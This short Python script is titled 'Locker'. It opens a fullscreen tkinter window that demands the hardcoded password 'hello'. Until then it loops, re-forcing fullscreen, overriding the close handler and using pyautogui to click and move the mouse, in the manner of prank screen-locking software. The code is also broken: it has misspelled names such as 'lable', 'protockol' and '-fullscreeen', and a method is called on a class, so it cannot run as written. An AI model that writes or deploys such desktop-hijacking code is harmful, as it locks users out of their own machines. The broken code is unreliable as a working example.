from tkinter import Tk,Entry,lable
from pyautogui import click, moveTo
from time import sleep
def callback (event):

	global k, entry

	if entry.get()=="hello":k=True

def on_closing():

	click(675, 420)

	moveTo(675,410)

	root.attributes("-fullscreen",True)

	root.protockol("WM_DELETE_WINDOW", on_closing)

	root.update()

	root.bind('<Control-KeyPress-c>', callback)

root=Tk()
root.title("Locker")
root.attributes("-fullscreeen",True)
entry=Entry(root,font=1)
entry.place(width=150, height=50, x=600, y=400)
lable0=lable(root,text="Locker_by_#571", font=1)
lable0.grid(row=0,column=0)
lable0=lable(root,text="Write the password and Press Ctrl+C", font ='Arial 20')
lable.place(x=470, y=300)
root.update(); sleep(0.2); click(675,420)
k=False
while k!=True: on_closing()
